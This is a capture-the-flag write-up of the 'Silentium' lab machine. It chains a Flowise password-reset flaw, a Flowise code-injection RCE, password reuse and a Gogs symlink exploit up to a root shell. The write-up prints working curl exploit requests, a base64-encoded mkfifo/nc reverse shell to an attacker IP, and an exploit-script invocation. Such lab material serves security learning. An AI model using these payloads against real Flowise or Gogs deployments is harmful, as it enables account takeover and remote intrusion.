

<img src="Images/Silentium.png" width="200" alt="Silentium">


# Attack Chain
```
└─► ffuf → staging.silentium.htb + OSINT → ben@silentium.htb
	└─► CVE-2025-58434 (Flowise ≤2.2.6 — forgot-password leaks tempToken en clair)
        └─► Password reset → Flowise access as ben
            └─► CVE-2025-59528 (Flowise RCE)
                └─► Shell as root in Docker container
                    └─► env → FLOWISE_PASSWORD + SMTP_PASSWORD=r04D!!_R4ge
                        └─► SSH ben:r04D!!_R4ge → Shell as ben
                            └─► Gogs app.ini → New subdomain
	                            └─► CVE-2025-8110 (Symlink + sshCommand injection)
                                    └─► Shell as root
```

<img src="Images/Attack%20Chain.png" width="696" alt="Attack Chain">
# Sommaire

- [Enumeration](#enumeration)
	- [Nmap](#nmap)
	- [Subdomains](#subdomains)
- [Silentium.htb](#silentiumhtb)
- [Flowise](#flowise)
	- [User found](#user-found)
	- [CVE-2025-58434 - Intercepting ATO and Password Reset](#cve-2025-58434---intercepting-ato-and-password-reset)
	- [CVE-2025-59528 - RCE](#cve-2025-59528---rce)
- [Docker Enumeration](#docker-enumeration)
	- [ash_history](#ash_history)
	- [Environment variables](#environment-variables)
- [Privilege Escalation](#privilege-escalation)
	- [MailHog](#mailhog)
	- [Gogs](#gogs)
	- [CVE-2025-8110](#cve-2025-8110)

---

# Enumeration

### Nmap

Let's scan the target with `nmap`.
```
nmap -sVC 10.129.*.*
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-11 21:15 CEST
Nmap scan report for 10.129.*.*
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
```

We add `silentium.htb` to `/etc/hosts`.

```
echo '10.129.*.* silentium.htb' | tee -a /etc/hosts 
```
### Subdomains

Searching for Subdomains

```
ffuf -fs 178 -c -w `fzf-wordlists` -H 'Host: FUZZ.silentium.htb' -u "http://10.129.*.*/"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.*.*/
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 33ms]
```

We got a match for **staging**, let's add an entry again to `/etc/hosts`

```
echo '10.129.*.* staging.silentium.htb' | tee -a /etc/hosts
```
# Silentium.htb

There is not much on the main website except this part where we are given names of employees in the company. Let's write them down in case we need them.

![Username list](Images/Username%20list.png)


# Flowise

On `http://staging.silentium.htb/` we are facing a login page.
![Flowise - Login](Images/Flowise%20-%20Login.png)

### User found

We can try the names of the employees followed by the domain of the target that we found on the main website to see if one exist with a weak password such as admin.

![Flowise - User Found](Images/Flowise%20-%20User%20Found.png)

We now know that `ben@silentium.htb` exist because of the error message displayed.

### CVE-2025-58434 - Intercepting ATO and Password Reset

We can request the version used by the target with the following `curl` request

```
curl -i http://staging.silentium.htb/api/v1/version
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 12 Apr 2026 16:35:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 19
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"13-wL0siNAZfGEC1xvzt+/DTEDTEX4"

{"version":"3.0.5"}
```

**Flowise 3.0.5** is used and is vulnerable to 2 CVE

- **CVE-2025-58434** :  unauthenticated Password Reset
- **CVE-2025-59528** : Authenticated RCE

We can follow [this](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph) POC to perform the first CVE in order to gain an authenticated access.

First we do the following `curl` command to request a token to reset ben's password :
```
curl -i -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \
     -H 'Content-Type: application/json' \
     -d '{"user": {"email": "ben@silentium.htb"}}'

HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 11 Apr 2026 19:45:12 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-wbVTuNJoDObxRlBGAJUKM+NdzsU"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"TyFg7QUb6waBK5nkR16Jm1H4EyCKkyntSYZvqmmzZ6hYKwLSyJrIyC7qyEQSHZWj","tokenExpiry":"2026-04-11T20:00:12.166Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-11T19:45:12.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

We grab the value inside `TempToken` and we do another `curl` command to define a new password

```
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"ben@silentium.htb",
	 "tempToken":"TyFg7QUb6waBK5nkR16Jm1H4EyCKkyntSYZvqmmzZ6hYKwLSyJrIyC7qyEQSHZWj",
          "password":"Password123!"
        }
      }'
```

We can now login as ben with the password `Password123!`

### CVE-2025-59528 - RCE

It's time to exploit the other CVE we found by following [this](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) POC.

We need to grab the API key under **API keys** in Flowise first.

![Flowise API key](Images/Flowise%20API%20key.png)

We must encode our reverse shell payload in base64 before proceeding to avoid breaking the JSON format:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.*.* 443 >/tmp/f' | base64
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0
Ljk3IDQ0MyA+L3RtcC9mCg==
```

And we can finally exploit the vulnerability.

```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0Ljk3IDQ0MyA+L3RtcC9m | base64 -d | sh\");return 1;})()})"
    }
  }'
```

We should receive a connection on our listener

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.*.*:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from c78c3cceb7ba~10.129.*.*-Linux-x86_64 😍️ Assigned SessionID <1>

<SNIP>

/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# Docker Enumeration

We are in a docker container so we need to find a way to pivot to the target machine.
### ash_history

We can access the `.ash_history` of the root user let's see what's inside.
```
# cd root
# cat .ash_history
env
exit
 dNdYIlawdJ=hkeRAlTteX wjKgvSbFPt=jodRybTODV;printf $dNdYIlawdJ$wjKgvSbFPt;echo $$;printf $wjKgvSbFPt$dNdYIlawdJ
 UJRMyLNaLL=cSKaNeJNaj KNxkSuPdco=muJsmNYCTe;printf $UJRMyLNaLL$KNxkSuPdco;echo "$(id -un)($(id -u))";printf $KNxkSuPdco$UJRMyLNaLL
 xzldUlKeVU=XhGoidAsOO syGCvjxbIx=KnMMRBkTeo;printf $xzldUlKeVU$syGCvjxbIx;tty;printf $syGCvjxbIx$xzldUlKeVU
id
ls
cd /root
ls -la
```
### Environment variables

`env` has been used in the command history so maybe it contains something valuable.
```
# env
<SNIP>

SMTP_PASSWORD=r04D!!_R4ge

<SNIP>
```

We found an SMTP Password, let's try to see if the password is reused for ben.

### Shell as Ben

```
ssh ben@10.129.*.*
ben@10.129.*.*'s password: r04D!!_R4ge
ben@silentium:~$
```
The password is indeed working.

# Privilege Escalation

Let's look for Privilege Escalation now.

```
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```
Nothing uncommon

We know that an SMTP service is in use, let's see which port are listening to see if we can access the mail portal.

```
ben@silentium:~$ ss -tnlup
Netid      State       Recv-Q      Send-Q           Local Address:Port             
udp        UNCONN      0           0                   127.0.0.54:53
udp        UNCONN      0           0                127.0.0.53%lo:53
udp        UNCONN      0           0                      0.0.0.0:68
tcp        LISTEN      0           4096                 127.0.0.1:1025
tcp        LISTEN      0           4096             127.0.0.53%lo:53
tcp        LISTEN      0           4096                 127.0.0.1:8025
tcp        LISTEN      0           4096                   0.0.0.0:22
tcp        LISTEN      0           511                    0.0.0.0:80
tcp        LISTEN      0           4096                 127.0.0.1:33421
tcp        LISTEN      0           4096                127.0.0.54:53
tcp        LISTEN      0           4096                 127.0.0.1:3001
tcp        LISTEN      0           4096                 127.0.0.1:3000
tcp        LISTEN      0           4096                      [::]:22
tcp        LISTEN      0           511                       [::]:80
```
### MailHog

**8025** is the default port of **MailHog**, we can forward it to our machine to access the web interface

```
ssh -L 8025:127.0.0.1:8025 ben@silentium.htb
```


![MailHog](Images/MailHog.png)
Aside of the mail sent before when exploiting the **CVE-2025-58434**, there is nothing here.

### Gogs

Apparently gogs is running on the target and we can enumerate it's file beside the sqlite db.
```
ben@silentium:/opt/gogs/gogs/custom/conf$ cat app.ini
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
OFFLINE_MODE     = false
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = false

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD =
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = false
```
We notice it's running on port 3001 and that the subdomain used is `staging-v2-code.dev.silentium.htb`. Let's add it to our `/etc/hosts` file and try to access it

```
echo '10.129.17.151 staging-v2-code.dev.silentium.htb' | tee -a /etc/hosts
```

### CVE-2025-8110

```
ben@silentium:/opt/gogs/gogs$ ./gogs --version
Gogs version 0.13.3
```

The version of Gogs used by the target is **0.13.3** which is vulnerable to **CVE-2025-8110**.
Gogs is running as root, so exploiting the CVE would give us root access on the target.

We do not need to gain access of a privileged user but we need to register an account to exploit the target.


![Gogs Register](Images/Gogs%20Register.png)
Now we need to generate a New Token under "_Your settings --> Applications --> Generate New Token_" and copy its value.


![Token Gogs](Images/Token%20Gogs.png)

We can use [this](CVE-2025-8110.py.md) script to exploit the target with all the information that we got.

```
python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -U makis -p makis -t dd920f6f35c5150432ec66ba6ff9f5c759e86c4b -lh 10.10.14.* -lp 443
[+] Connected
[+] Repo creation status: 201
[+] Repo created : 449d0c6afc40
[master 24a4a06] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
[+] Symlink pushed
```

And we should get a connection on our listener

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.*.*:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from silentium~10.129.*.*-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /root/.penelope/sessions/silentium~10.129.*.*-Linux-x86_64/2026_04_12-17_32_10-807.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from silentium~10.129.*.*-Linux-x86_64 😍️ Assigned SessionID <2>
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
```

Machine rooted




